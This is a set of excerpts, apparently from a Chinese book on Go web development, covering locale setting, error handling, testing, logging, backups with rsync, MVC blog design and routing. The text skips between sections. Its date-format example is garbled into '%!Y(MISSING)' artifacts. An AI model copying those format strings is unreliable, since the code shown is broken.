locale名通常由三个部分组成：第一部分，是一个强制性的，表示语言的缩写，例如“en”表示英文或“zh”表示中文。第二部分，跟在一个下划线之后，是一个可选的国家说明符，用于区分讲同一种语言的不同国家，例如“en_US”表示美国英语，而“en_UK”表示英国英语。最后一部分，跟在一个句点之后，是可选的字符集说明符，例如“zh_CN.gb2312”表示中国使用gb2312字符集。
GO语言默认采用“UTF-8”编码集，所以我们实现i18n时不考虑第三部分，接下来我们都采用locale描述的前面两部分来作为i18n标准的locale名。


在Linux和Solaris系统中可以通过locale -a命令列举所有支持的地区名

● 用户通过域名可以很直观地知道将访问哪种语言的站点。


        if r.Host == "www.asta.com" {￼
            i18n.SetLocale("en")￼
        } else if r.Host == "www.asta.cn" {￼
            i18n.SetLocale("zh-CN")￼
        } else if r.Host == "www.asta.tw" {￼
            i18n.SetLocale("zh-TW")￼
        }

除了整域名设置地区之外，我们还可以通过子域名来设置地区，例如“en.asta.com”表示英文站点，“cn.asta.com”表示中文站点。实现代码如下所示。
￼
        prefix := strings.Split(r.Host,".")￼
        if prefix[0] == "en" {￼
            i18n.SetLocale("en")￼
        } else if prefix[0] == "cn" {￼
            i18n.SetLocale("zh-CN")￼
        } else if prefix[0] == "tw" {￼
            i18n.SetLocale("zh-TW")￼
        }

首先，域名成本比较高，开发一个Locale就需要一个域名，而且往往统一名称的域名不一定能申请的到，其次，我们不愿意为每个站点去本地化一个配置，而更多的是采用url后面带参数的方式，请看下面的介绍。
从域名参数设置Locale

目前最常用的设置 Locale 的方式是在 URL 里面带上参数，例如 www.asta.com/hello?locale=zh 或者 www.asta.com/zh/hello。这样我们就可以设置地区：i18n.SetLocale (params["locale"])。

例如：www.asta.com/en/books （英文站点）和www.asta.com/zh/books（中文站点），这种方式的URL更加有利于SEO，而且对于用户也比较友好，能够通过URL直观的知道访问的站点。那么这样的URL地址可以通过router来获取Locale（参考第8.3节介绍的router插件实现）。
￼
        mux.Get("/:locale/books", listbook)

● 用户profile
当然你也可以让用户根据你提供的下拉菜单或者其他方式设置相应的 locale，然后将用户输入的信息，保存到与它账号相关的profile中，当用户再次登录的时候把这个设置复写到 Locale 设置中，这样就可以保证该用户每次访问都是基于自己先前设置的Locale来获得页面。

### 10.2 本地化资源

设置好Locale之后我们需要解决的问题就是如何存储相应的Locale对应的信息。这里面的信息包括：文本信息、时间和日期、货币值、图片、包含文件及视图等资源。

文本信息在编写 Web 应用中最常用到，也是本地化资源中最多的信息，想要以适合本地语言的方式来显示文本信息，可建立所需语言相应的 map 来维护一个 key-value的关系，在输出之前按需从适合的map中去获取相应的文本，如下是一个简单的示例。

locales = make(map[string]map[string]string, 2)￼
            en := make(map[string]string, 10)￼
            en["pea"] = "pea"￼
            en["bean"] = "bean"￼
            locales["en"] = en￼
            cn := make(map[string]string, 10)￼
            cn["pea"] = "豌豆"￼
            cn["bean"] = "毛豆"￼
            locales["zh-CN"] = cn￼

1.时区问题
2.格式问题

en["date_format"]="%!Y(MISSING)-%!m(MISSING)-%!d(MISSING) %!H(MISSING):%!M(MISSING):%!S(MISSING)"￼
        cn["date_format"]="%!Y(MISSING)年%!m(MISSING)月%!d(MISSING)日 %!H(MISSING)时%!M(MISSING)分%!S(MISSING)秒"￼

### 10.3 国际化站点

为了支持国际化，我们在此使用了一个国际化相关的包——go-i18n（https://github.com/astaxie/go-i18n），首先我们向go-i18n包注册config/locales这个目录，以加载所有的locale文件。

### 第11章 错误处理、调试和测试

很多行业外人士觉得程序员是设计师，能够把一个系统从无做到有，是一项很伟大的工作，相当有趣，但事实上我们每天都是徘徊在排错、调试、测试之间。当然如果我们有良好的习惯和技术方案来直面这些问题，就有可能将排错时间减到最少，而尽可能将时间花费在更有价值的事情上。

### 11.1 错误处理


        type error interface {￼
            Error() string￼
        }

我们在很多内部包里面用到的 error是errors包下实现的私有结构errorString。
￼
        // errorString is a trivial implementation of error.￼
        type errorString struct {￼
            s string￼
        }￼
        func (e *errorString) Error() string {￼
            return e.s￼
        }

你可以通过errors.New把一个字符串转化为errorString，以得到一个满足接口error的对象，其内部实现如下。
￼
        // New returns an error that formats as the given text.￼
        func New(text string) error {￼
            return &errorString{text}￼
        }

我们来参考一下net包采用的方法。
￼
        package net￼
        type Error interface {￼
            error￼
            Timeout() bool   // Is the error a timeout?￼
            Temporary() bool // Is the error temporary?￼
        }

在调用的地方，通过类型断言 err 是不是 net.Error，来细化错误的处理，如果一个网络发生临时性错误，那么将会sleep 1秒之后重试。
￼
        if nerr, ok := err.(net.Error); ok && nerr.Temporary() {￼
            time.Sleep(1e9)￼
            continue￼
        }￼

func (fn appHandler) ServeHTTP(w http.ResponseWriter, r *http.Request) {￼
            if err := fn(w, r); err != nil {￼
                http.Error(w, err.Error(), 500)￼
            }￼
        }

### 11.3 Go语言怎么写测试用例

Go语言中自带有一个轻量级的测试框架testing和自带的go test命令来实现单元测试和性能测试，testing框架和其他语言中的测试框架类似，你可以基于这个框架写针对相应函数的测试用例，也可以基于该框架写相应的压力测试用例

● 压力测试用例必须遵循如下格式，其中XXX可以是任意字母数字的组合，但是首字母不能是小写字母。
￼
        func BenchmarkXXX(b *testing.B) { ... }
● go test 不会默认执行压力测试的函数，如果要执行压力测试需要带上参数。-test.bench，语法:-test.bench="test_name_regex"，例如go test -test.bench=".*"表示测试全部的压力测试函数。

### 12.1 应用日志

● 支持不同的日志输出
㊣ 命令行输出
㊣ 文件输出
㊣ 缓存输出
㊣ 支持log rotate
㊣ SMTP邮件

logs.Logger.Critical("test Critical message")
现在，只要我们的应用在线上记录一个 Critical 的信息，你的邮箱就会收到一个E-mail，这样一旦线上的系统出现问题，你就能立马通过邮件获知，以便及时处理。

### 12.2 网站错误处理

5.网络出错包括两方面：一方面是用户请求应用程序的时候出现网络断开，这样就导致连接中断，这种错误不会造成应用程序的崩溃，但是会影响用户访问的效果；另一方面是应用程序读取其他网络上的数据，其他网络断开会导致读取失败，这种需要对应用程序做有效的测试，以避免这类问题出现的情况下程序崩溃。

如下代码，我们期望通过uid来获取User中的username信息，但是如果uid越界了就会抛出异常，这个时候如果我们没有 recover 机制，进程就会被杀死，从而导致程序不可服务。因此，为了程序的健壮性，需要在一些地方建立recover机制。

defer func() {￼
                if x := recover(); x != nil {￼
                    username = ""￼
                }￼
            }()￼

上面介绍了错误和异常的区别，那么我们在开发程序的时候如何来设计呢？规则很简单，如果定义的函数失败，它就应该返回一个错误。当我们调用其他package的函数时，如果这个函数实现得很好，我们不需要担心它会 panic，除非真有异常情况发生，即使那样也不应该是我们去处理它。而panic和recover是针对自己开发package里面实现的逻辑，针对一些特殊情况来设计。

### 12.4 备份和恢复

这里我们介绍一个文件同步工具rsync：rsync能够实现网站的备份，不同系统的文件的同步

● 服务端开启
￼
        #/usr/bin/rsync --daemon  --config=/etc/rsyncd/rsyncd.conf
--daemon参数方式，是让rsync以服务器模式运行。把rsync加入开机启动。
￼
        echo 'rsync --daemon' >> /etc/rc.d/rc.local
设置rsync密码。
￼
        echo '你的用户名:你的密码' > /etc/rsyncd.secrets￼
        chmod 600 /etc/rsyncd.secrets

● 客户端同步
客户端可以通过如下命令同步服务器上的文件。
￼
        rsync -avzP  --delete  --password-file=rsyncd.secrets   用户名@192.168.￼
    145.5::www /var/rsync/backup

前面介绍MySQL备份分为热备份和冷备份，热备份主要目的是为了能够实时恢复，例如应用服务器出现了硬盘故障，那么我们可以通过修改配置文件把数据库的读取和写入改成slave，这样就可以尽量少时间中断服务。
但是有时候我们需要通过冷备份的SQL来进行数据恢复，既然有了数据库的备份，就可以通过命令导入。
￼
        mysql -u username -p databse < backup.sql

我们这里介绍冷备份的方式：redis会定时把内存里的缓存数据保存到数据库文件里面，我们只要备份相应的文件就可以，就是利用前面介绍的rsync备份到非本地机房。

### 12.5 总结

● 创建一个强健的日志系统，可以在出现问题时记录错误并且通知系统管理员。

### 13.1 项目规划

博客系统基于模型-视图-控制器这一设计模式。MVC是一种将应用程序的逻辑层和表现层进行分离的结构方式。在实践中，由于表现层从Go语言中分离，所以它允许网页中只包含很少的脚本。
● 模型（Model）代表数据结构。通常来说，模型类将包含取出、插入、更新数据库资料等功能。

博客的目录结构设计如下所示。
￼
        |——main.go          入口文件￼
        |——conf             配置文件和处理模块￼
        |——controllers      控制器入口￼
        |——models           数据库处理模块￼
        |——utils            辅助函数库￼
        |——static           静态文件目录￼
        |——views            视图库

### 13.2 自定义路由器设计

HTTP路由组件负责将HTTP请求交到对应的函数处理（或者是一个struct的方法），如前面所描述的结构图，路由在框架中相当于一个事件处理器，这个事件包括：
● 用户请求的路径（path）（例如/user/123、/article/123），当然还有查询串信息（例如?id=11）。
● HTTP的请求方法（method）（GET、POST、PUT、DELETE、PATCH等）。
路由器就是根据用户请求的事件信息转发到相应的处理函数（控制层）。

Go语言默认，通过函数http.Handle和http.HandleFunc等来添加路由信息，底层都是调用了DefaultServeMux.Handle（pattern string，handler Handler），这个函数会把路由信息存储在一个map信息中map[string]muxEntry。


但是Go语言自带的路由器有以下几个限制。
● 不支持参数设定，例如/user/:uid 这种泛类型匹配。
● 无法很好地支持REST模式，无法限制访问的方法，例如用户访问/foo，可以用GET、POST、DELETE、HEAD等方式访问。
● 一般网站的路由规则太多了，编写繁琐。笔者开发了一个API应用，路由规则有三十几条，这种路由多了之后可以进一步简化，通过struct的方法进行一种简化。

### 13.3 日志和配置设计

beego的日志设计部署思路来自于seelog，根据不同的level来记录日志，但是beego设计的日志系统比较轻量级，采用了系统的log.Logger接口，默认输出到os.Stdout，用户可以实现这个接口然后通过beego.SetLogger设置自定义的输出

### 14.1 静态文件支持

Bootstrap是Twitter推出的用于前端开发的开源工具包。对于开发者来说，Bootstrap是快速开发Web应用程序的最佳前端工具包。它是一个CSS和HTML的集合，它使用了最新的HTML5标准，为Web开发提供了时尚的版式、表单、按钮、表格、网格系统等。

### 14.2 Session支持

beego框架基于SessionManager实现了方便的Session处理功能。

### 14.4 用户认证

一般认证分为三个方面。
● HTTP Basic和 HTTP Digest认证。
● 第三方集成认证：QQ、微博、豆瓣、OPENID、google、github、Facebook和Twitter等。
● 自定义的用户登录、注册、登出，一般都是基于Session、Cookie认证。